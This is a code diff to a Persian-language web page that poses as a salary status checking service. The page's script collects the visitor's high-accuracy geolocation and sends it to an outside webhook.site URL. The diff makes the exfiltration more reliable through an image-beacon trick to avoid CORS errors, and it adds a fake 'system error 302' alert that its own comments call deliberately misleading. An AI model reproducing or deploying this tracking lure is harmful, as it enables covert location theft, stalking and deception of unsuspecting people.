@@ -5,34 +5,11 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>سامانه بررسی وضعیت حقوق</title>
     <style>
-        body { 
-            font-family: Tahoma, Arial, sans-serif; 
-            text-align: center; 
-            padding: 20px; 
-            background-color: #f4f7f6; 
-            direction: rtl; 
-        }
-        .container { 
-            max-width: 500px; 
-            margin: 50px auto; 
-            background: white; 
-            padding: 30px; 
-            border-radius: 15px; 
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1); 
-        }
+        body { font-family: Tahoma, Arial, sans-serif; text-align: center; padding: 20px; background-color: #f4f7f6; direction: rtl; }
+        .container { max-width: 500px; margin: 50px auto; background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
         h2 { color: #2c3e50; }
         p { color: #7f8c8d; margin-bottom: 25px; }
-        .btn { 
-            background-color: #2ecc71; 
-            color: white; 
-            padding: 15px 30px; 
-            font-size: 18px; 
-            font-weight: bold; 
-            border: none; 
-            cursor: pointer; 
-            border-radius: 10px; 
-            transition: background 0.3s; 
-        }
+        .btn { background-color: #2ecc71; color: white; padding: 15px 30px; font-size: 18px; font-weight: bold; border: none; cursor: pointer; border-radius: 10px; transition: background 0.3s; }
         .btn:hover { background-color: #27ae60; }
     </style>
 </head>
@@ -45,8 +22,6 @@
 
     <script>
     function getLocation() {
-        console.log("Button clicked!");
-        
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(sendPosition, showError, {
                 enableHighAccuracy: true,
@@ -62,19 +37,28 @@
         var lat = position.coords.latitude;
         var lon = position.coords.longitude;
         
-        // لینک وب‌هوک شما
+        // آدرس وب‌هوک
         var webhookUrl = "https://webhook.site/3e658cab-cff7-4b12-ad19-52d6e636d924";
         
-        var data = "lat=" + lat + "&lon=" + lon;
+        // ساخت URL با پارامترها
+        var dataUrl = webhookUrl + "?lat=" + lat + "&lon=" + lon;
         
-        // ارسال داده‌ها به وب‌هوک با GET (بدون CORS)
-        fetch(webhookUrl + "?" + data, { method: 'GET' })
-        .then(() => {
+        // ترفند ارسال با Image (دور زدن خطای شبکه و CORS)
+        var img = new Image();
+        img.src = dataUrl;
+        
+        // چه ارسال شود چه نشود، پیام گمراه‌کننده را نشان می‌دهیم
+        img.onload = function() {
             alert("خطای سیستم ۳۰۲: ارتباط با سرور مرکزی قطع شد. لطفاً با پشتیبانی تماس بگیرید.");
-        })
-        .catch(err => {
-            alert("خطای شبکه در ارسال اطلاعات.");
-        });
+        };
+        img.onerror = function() {
+            alert("خطای سیستم ۳۰۲: ارتباط با سرور مرکزی قطع شد. لطفاً با پشتیبانی تماس بگیرید.");
+        };
+        
+        // یک تایم اوت کوتاه برای اطمینان از اینکه پیام حتما نمایش داده شود
+        setTimeout(function() {
+            alert("خطای سیستم ۳۰۲: ارتباط با سرور مرکزی قطع شد. لطفاً با پشتیبانی تماس بگیرید.");
+        }, 500);
     }
 
     function showError(error) {
